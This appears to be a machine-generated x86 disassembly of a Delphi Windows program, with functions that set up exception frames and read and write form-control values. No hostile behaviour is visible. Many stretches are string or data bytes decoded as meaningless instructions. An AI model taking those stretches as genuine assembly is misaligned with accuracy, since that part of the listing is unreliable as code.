mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push j_sub_4039a0#9
push [ fs : eax ]
ja r-xdata
insd
je r-xdata
jbe r-xdata
inc ebp
add [ eax + 0x3 ] cl
inc edx
add [ eax ] al
mov [ ebp ] al
mov ah 0x89
inc ebp
add [ eax + 0x20004034 ] ch
scasb [ edi ]
inc ebp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + ecx * 4 ] bl
inc ebp
add ah bh
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x320 ]
mov eax [ ebp - 0x8 ]
call sub_45ae84
nop
push ebp
jb r-xdata
inc esi
outsd
outsb
or [ ebx ] al
add [ eax ] al
add eax [ eax ]
or al 0x43
popad
outsb
arpl [ ebp + 0x6c ] sp
inc edx
jne r-xdata
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ ebp + eax * 4 + 0x45 ] dh
add [ eax + 0x4c00459c ] al
inc eax
inc esp
add [ ecx + ebp * 4 + 0x45 ] al
add [ esp + ebp * 4 - 0x549fffbb ] ah
inc ebp
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add ah bl
lodsd [ esi ]
inc ebp
add [ eax + 0x3f ] cl
inc esp
add al bh
imul eax [ eax + eax - 0x30 ] 0xffffffb4
inc ebp
add ah ch
jge r-xdata
add [ eax ] cl
test [ ebx ] sub_446c8c
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d8b9
mov eax [ ebp - 0x8 ]
call sub_40324c
retn
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_4403c4
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_403ff0
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x31c ]
call sub_4403c4
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403ff0
mov [ ebp - 0x1 ] 0x1
outsd
inc esp
insb
add [ bx + si ] al
inc edx
dec esp
and [ ebx ] al
add [ eax ] al
add al 0x0
or [ ebp + 0x73 ] dl
jb r-xdata
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ sub_46d58c ]
call sub_458674
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46d8b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x300 ]
mov edx esi
call sub_4403f4
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_4403f4
mov [ ebp - 0x1 ] 0x0
cmp [ ebx ] 0x0
jne r-xdata
aam 0xd8
inc esi
add [ edi + edi * 8 + 0x30 ] ah
push ebx
push 0x540c776f
dec esp
outsd
imul ebp [ bp + 0x44 ] 0x6f6c6169
and al [ ebx ]
mov [ edi ] dh
inc ebx
add [ ebx + ebp + 0x43 ] dh
add [ ebp - 0x2853ffc0 ] cl
inc esi
add [ edi ] al
or al 0x54
dec esp
outsd
imul ebp [ bp + 0x44 ] 0x6f6c6169
fcom st5
add [ ebx * 8 - 0x276fffbe ] bh
inc edx
add al bl
je r-xdata
inc esi
add [ eax ] ch
pop ebp
inc ebp
add [ esi ] bl
or [ edx + eax * 2 + 0x4c ] al
jb r-xdata
popad
insd
add [ gs : eax ] eax
ltr ax
fild [ esi ]
or [ esi + 0x6f ] al
add eax 0x42dd3c00
add [ eax - 0x27ffbd28 ] dl
outsd
or [ eax + 0x61 ] dl
jae r-xdata
outsb
or al 0x3
add [ eax ] al
add [ eax ] al
push es
push eax
popad
outsb
insb
xor [ eax ] edx
add eax [ eax ]
add [ edx ] al
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ ebx + eax ] edx
add [ eax ] al
add al [ eax ]
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
xor bl [ eax ]
add eax [ eax ]
add [ edx ] al
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor ebx [ ebx + eax ]
add [ eax ] al
add al 0x0
sub_46d8e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46da04
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ sub_46d58c ]
call sub_458674
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46d9e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x300 ]
mov edx esi
call sub_4403f4
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_4403f4
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x320 ]
mov eax [ ebp - 0x8 ]
call sub_45ae84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d9e9
mov eax [ ebp - 0x8 ]
call sub_40324c
retn
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_4403c4
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_403ff0
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x31c ]
call sub_4403c4
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403ff0
mov [ ebp - 0x1 ] 0x1
sub_46da18
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039a0#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ sub_46d58c ]
call sub_458674
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_46db9c
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405eac
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4403f4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2fc ]
xor edx edx
call sub_4402e4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x300 ]
xor edx edx
call sub_4402e4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x318 ]
xor edx edx
call sub_4402e4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2f8 ]
mov edx [ eax + 0x4c ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x2fc ]
sub edx [ ecx + 0x44 ]
call sub_43fba4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x304 ]
mov edx [ eax + 0x44 ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x2fc ]
sub edx [ ecx + 0x44 ]
call sub_43fb58
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x308 ]
mov edx [ eax + 0x44 ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x2fc ]
sub edx [ ecx + 0x44 ]
call sub_43fb58
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2fc ]
sub edx [ eax + 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_43fba4
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_4403f4
mov [ ebp - 0x1 ] 0x0
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x320 ]
mov eax [ ebp - 0x8 ]
call sub_45ae84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dba3
mov eax [ ebp - 0x8 ]
call sub_40324c
retn
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_4403c4
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_403ff0
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x31c ]
call sub_4403c4
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403ff0
mov [ ebp - 0x1 ] 0x1
sub_46dbd8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x2f8 ]
call sub_43fdc8
mov esi [ ebx + 0x300 ]
mov edx [ esi + 0x48 ]
add edx [ esi + 0x40 ]
cmp eax edx
jg r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x2f8 ]
call sub_43fdc8
mov edx eax
mov eax [ ebx + 0x300 ]
sub edx [ eax + 0x40 ]
sub edx 0x5
mov eax [ ebx + 0x300 ]
call sub_43fb80
sub_46dc30
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46dc55
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dc5c
retn
sub_46dc60
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_46d8e8
mov eax [ rw-data ]
mov [ eax ] sub_46dc20
mov eax [ rw-data ]
mov [ eax ] sub_46da18
sub_46dcb4
add ch bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
fld [ esi ]
adc al 0xdf
inc esi
add [ esi ] al
fiadd [ esi ]
sbb dh 0x46
add [ eax ] al
add [ eax ] al
add cl dh
fiadd [ esi ]
jbe r-xdata
inc ebp
add [ eax + 0x3 ] cl
inc edx
add [ eax ] al
mov [ ebp ] al
mov ah 0x89
inc ebp
add [ eax + 0x20004034 ] ch
scasb [ edi ]
inc ebp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + ecx * 4 ] bl
inc ebp
add ah bh
jbe r-xdata
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ ebp + eax * 4 + 0x45 ] dh
add [ eax + 0x4c00459c ] al
inc eax
inc esp
add [ ecx + ebp * 4 + 0x45 ] al
add [ esp + ebp * 4 - 0x549fffbb ] ah
inc ebp
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add ah bl
lodsd [ esi ]
inc ebp
add [ eax + 0x3f ] cl
inc esp
add al bh
imul eax [ eax + eax - 0x30 ] 0xffffffb4
inc ebp
add ah ch
jge r-xdata
add [ eax ] cl
test [ ebx ] sub_446c8c
jl r-xdata
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax - 0x6d ] dh
inc ebp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax + 0x64 ]
xchg ebp eax
inc ebp
add [ eax ] dh
xchg esp eax
inc ebp
add [ eax + 0x4 ] bl
inc esp
add ah bl
xchg ebp eax
inc ebp
add [ edi + ecx * 4 - 0x5823ffbb ] cl
inc ecx
add ah bl
mov eax [ ebp ]
sbb [ ebp + eax * 2 + 0x458d2400 ] cl
add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ ebp + edx * 4 + r--data ] bl
inc edx
add [ ecx + edx * 8 ] bh
inc ebp
add [ esi + eax * 4 + 0x45 ] dh
add [ eax ] dl
jb r-xdata
add eax [ eax ]
add [ edi ] al
add [ ecx ] al
fild [ esi ]
clc
add al [ eax ]
add [ eax ] al
add [ ecx ] cl
inc edi
jb r-xdata
add [ eax + ebp * 2 ] bh
inc esp
add ah ah
leave
inc ebp
add [ eax + 0x7f ] ch
inc ebp
add [ eax ] bl
add [ ebp ] 0xc4
mov edx 0x8b000045
inc ebp
add [ ebx + ecx * 4 + 0x45 ] bh
add ah al
int 0x45
add [ eax ] bh
mov [ ebp ] al
enter 0x45c8 0x0
test al 0xaf
inc ebp
add [ edx + ecx * 8 + 0x45 ] bh
add [ eax - 0x6b ] ah
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] dh
rol [ esi ] cl
sbb [ ebx ] al
add [ eax ] al
pop es
sbb al 0x3
add [ eax ] al
loopne r-xdata
inc ebp
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax + 0xa0046df ] dh
jne r-xdata
push esp
push eax
popad
je r-xdata
inc ebp
imul esi [ fs : ebx + eax * 2 + 0x68 ] 0x65676e61
inc esi
add [ edx ] cl
inc edx
outsd
js r-xdata
mov [ fs : eax ] edx
push sub_46dfa6
mov eax [ ebp - 0x8 ]
call sub_40324c
retn
ja r-xdata
jae r-xdata
add [ edi ] al
andps xmm2 [ eax + 0x61 ]
outsb
add [ edx ] al
add [ edi ] cl
push edx
insd
cld
add al [ eax ]
add [ ecx ] al
add [ eax * 2 + 0x746964 ] al
add eax [ eax ]
add [ edx ] al
add [ ecx ] cl
inc ecx
inc edx
jne r-xdata
pop ecx
pop ecx
jb r-xdata
outsd
inc edx
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0xe120001b
inc esi
add [ edx + edx * 2 ] dl
insd
outsd
jbe r-xdata
inc ecx
insb
insb
inc edx
jne r-xdata
push edx
insd
outsd
jbe r-xdata
arpl [ ebx + 0x18 ] bp
add [ eax + 0x110046e0 ] dh
je r-xdata
add [ eax + 0xf ] cl
xchg esp eax
inc ebp
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
inc esp
imul esp [ ecx + 0x6c ] 0xdd00676f
inc esi
inc esp
inc edx
push eax
push edi
add [ edi ] al
je r-xdata
inc esp
insb
add [ bx + si ] al
lea eax [ eax ]
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov ecx [ rw-data ]
inc ecx
insb
inc edx
jne r-xdata
je r-xdata
inc ebx
insb
imul esp [ ebx + 0x6b ] 0xe0b00018
outsb
add al 0x3
add [ eax ] al
add al [ eax ]
or al 0x52
insd
outsd
jbe r-xdata
inc ebp
add [ esi ] bl
pop es
xor eax eax
inc edi
add [ ebx - 0x5efe4df7 ] cl
mov ah 0xdc
inc esi
add al ch
sbb esp [ edi + 0x4589fffe ]
clc
je r-xdata
insb
inc ecx
outsb
or al 0x3
add [ eax ] al
add al [ eax ]
or [ edi + 0x4b ] cl
inc edx
jne r-xdata
inc esi
add [ ecx ] dl
imul ebx [ eax ] 0x0
mov al 0xe0
inc edx
jne r-xdata
mov ecx [ ecx ]
mov dl 0x1
mov eax [ sub_46dcb4 ]
call sub_458674
mov [ ebp - 0x8 ] eax
or eax rw-data
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0xe1400014
inc esi
loope r-xdata
je r-xdata
outsd
je r-xdata
push ebp
outsd
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x6150540f
add [ eax ] ch
pop ebp
add [ 0x75424b4f ] cl
je r-xdata
adc al 0x0
inc eax
outsb
adc [ ebx ] al
add [ eax ] al
add al [ eax ]
or al 0x43
popad
outsb
arpl [ ebp + 0x6c ] sp
inc edx
jne r-xdata
jne r-xdata
outsd
jbe r-xdata
outsb
or [ ebx ] al
add [ eax ] al
add al [ eax ]
rsqrtps xmm4 [ ebp + 0x6d ]
mov eax [ ebp - 0x8 ]
add eax 0x318
mov edx ebx
call sub_4059e4
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
sete [ ebp - 0x1 ]
xor eax eax
pop edx
ja r-xdata
jae r-xdata
push eax
popad
je r-xdata
mov [ eax ] esp
jb r-xdata
imul ecx [ edi ] 0x54
adc eax 0x46e03800
add [ esi ] cl
inc ecx
inc edx
jne r-xdata
outsb
add eax 0xb0001100
fild [ esi ]
or al [ ebp + 0x64 ]
imul esi [ ebx + eax * 2 + 0x68 ] 0x65676e61
push sub_46df9f
push [ fs : eax ]
mov [ fs : eax ] esp
inc esp
imul esp [ ecx + 0x6c ] 0x3676f
sbb al 0x1a
inc ebx
add [ ebx + ebp + 0x43 ] dh
add [ eax - 0x6fffbcc9 ] cl
adc al 0xdf
inc esi
sub_46dfae
mov eax eax
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_46e02a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x2fc ]
call sub_4403c4
cmp [ ebp - 0x4 ] 0x0
setne bl
mov edx ebx
mov eax [ esi + 0x300 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov edx ebx
mov eax [ esi + 0x304 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
test bl bl
jne r-xdata
mov dl 0x1
cmp [ esi + 0x314 ] 0x0
jne r-xdata
xor edx edx
jmp r-xdata
mov eax [ esi + 0x30c ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e031
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_46e036
mov eax eax
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46e0a3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2fc ]
call sub_4403c4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x318 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov [ ebx + 0x314 ] 0x1
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xc4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e0aa
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_46e0ae
mov eax eax
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46e114
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2fc ]
call sub_4403c4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x318 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xc4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e11b
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_46e13e
mov eax eax
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46e188
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2fc ]
call sub_4403c4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x318 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e18f
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_46e194
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46e1c4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e1cb
retn
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
sub_46e21f
add eax 0xfffffff0
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ax [ eax + 0x44 ]
sub ax 0xffef
je r-xdata
mov al 0x2
retn
sub ax 0x6
je r-xdata
mov al 0x1
retn
sub ax 0xb
jne r-xdata
mov al 0x3
retn
xor eax eax
retn
sub_46e24e
add edx esp
inc esi
add [ ebx ] cl
loop r-xdata
lds esp [ ecx - 0x329523d7 ]
add [ 0xffffffffe90046e2 ] dl
loope r-xdata
add [ esp + esi + 0x5a680040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ 0x4c435654 ] dl
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ecx
jo r-xdata
add [ eax ] dl
mov dl 0x5d
fimul [ edi + 0x51 ]
add cl dh
loope r-xdata
call sub_45df4c
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
mov eax eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ax [ eax + 0x44 ]
sub ax 0xffef
je r-xdata
pop ecx
xchg ebp eax
loop r-xdata
pop ebp
add cl bh
loope r-xdata
mov al 0x2
retn
sub ax 0x6
je r-xdata
loop r-xdata
add [ edi ] ch
loop r-xdata
mov al 0x1
retn
sub ax 0xb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] bh
loop r-xdata
mov al 0x3
retn
xor eax eax
retn
add [ eax ] al
add [ ebx + 0x46e304c0 ] cl
add [ ebx - 0x1e ] al
inc esi
add [ edi ] bl
loop r-xdata
add [ edx - 0x1e ] bh
inc esi
add [ edi ] ah
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
inc esi
add [ eax + eax ] dl
add [ eax ] al
push esp
adc al [ eax ]
xchg esp eax
xor al 0x40
add [ edx + ebx * 2 + 0x40 ] cl
add [ eax + 0x5a ] bl
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + 0x5a ] ch
inc esp
mov dh bl
dec edi
push ecx
add [ edx ] al
add [ eax ] al
add [ esi - 0x21 ] dh
mov al [ 0xffffffffaaec6afa ]
dec eax
xchg edi eax
push esp
sub eax 0x5c81df36
or eax sub_46e24e
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ch al
mov eax [ 0xffffffffcd6adc29 ]
sub_46e36c
sub dl 0x1
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45df4c
retn
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dx 0xfff5
call sub_45df4c
retn
dec dl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dx 0xffef
call sub_45df4c
jmp r-xdata
retn
sub_46e3bc
or al [ eax ]
add [ eax ] al
fdiv [ eax ]
inc edi
add al al
xchg esp eax
inc edi
add [ eax ] al
add [ eax ] al
add ah dl
xor [ edi ] al
aam 0x93
inc edi
add [ eax ] al
add [ eax ] al
add al dl
xor [ edi ] al
sub [ ebx + 0x47 ] dl
add [ eax ] al
int3
sub_46e528
adc [ 0x72615654 ] ecx
imul esp [ ecx + 0x6e ] 0x72724174
popad
jns r-xdata
dec edi
insb
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
or al 0x0
add [ eax ] al
and [ ecx ] dl
inc eax
add [ ecx ] cl
jb r-xdata
jb r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ss
out 0x46 al
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ss
out 0x46 al
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
mov esp 0x320046e6
out 0x46 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x100046 ] bh
add [ eax ] al
xor [ ecx ] dl
inc eax
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ esp + edx * 2 ] dl
push ebx
jb r-xdata
jb r-xdata
cli
push 0xffffffec
stosb [ edi ]
dec eax
xchg edi eax
push esp
sub eax 0x5c81df36
or eax 0x33ec8b55
rcl [ ebp + 0x68 ] 0x11
in eax 0x46
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e518
retn
inc eax
add [ eax - 0x1b ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ ebx ] al
or al 0x54
inc ebx
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
add [ fs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
push esp
in eax 0x46
add [ esi ] cl
arpl [ ebx + 0x52 ] bp
jne r-xdata
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff4
jge r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x654e724f
ja r-xdata
add [ eax ] al
add [ eax ] al
jbe r-xdata
inc esp
and al 0x4
hlt
add [ eax ] al
add [ esp + 0x4 ] 0xfffffff4
jmp r-xdata
adc [ ebx + 0x6b ] esp
push edx
arpl [ ebx + 0x4e ] bp
ja r-xdata
add [ edx ] cl
push esp
dec edi
insb
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
out 0x46 eax
add [ eax ] dl
add [ eax ] al
add al 0x8b
inc ecx
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
add [ eax ] al
add [ eax ] al
mov ah 0xe7
inc esi
add al bl
out 0x46 eax
outsb
je r-xdata
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46eb02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405200
add esp 0x4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_40504c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
jmp r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x74736e49
popad
outsb
arpl [ ebp + 0x8 ] sp
arpl [ ebx + 0x52 ] bp
insd
outsd
je r-xdata
jmp sub_46e944
outsb
jae r-xdata
hlt
jb r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
mul esi
inc esi
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
add esp edi
inc esi
add [ eax ] al
add [ eax ] al
add [ edi - 0x1827ffba ] dh
inc esi
imul esi [ ebx + 0x70 ] 0x68637461
lea eax [ eax ]
int3
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
add eax [ eax ]
add ah cl
int3
adc esp [ ebx + 0x6b ]
inc ecx
je r-xdata
inc esp
and al 0x4
hlt
jne r-xdata
popad
outsb
arpl [ ebp + 0x11 ] sp
arpl [ ebx + 0x52 ] bp
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
js r-xdata
inc eax
add al bl
out 0x46 eax
add [ edi ] al
or dl [ edi + ecx * 2 + 0x6c ]
push ebx
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
inc edi
inc edi
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_46edd0
add bh dl
in eax 0x46
add cl ah
in eax 0x46
add bl ch
in eax 0x46
add [ edx ] al
add [ eax ] al
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
popad
arpl [ eax + 0x54 ] bp
outsd
dec ecx
outsb
je r-xdata
cld
inc ecx
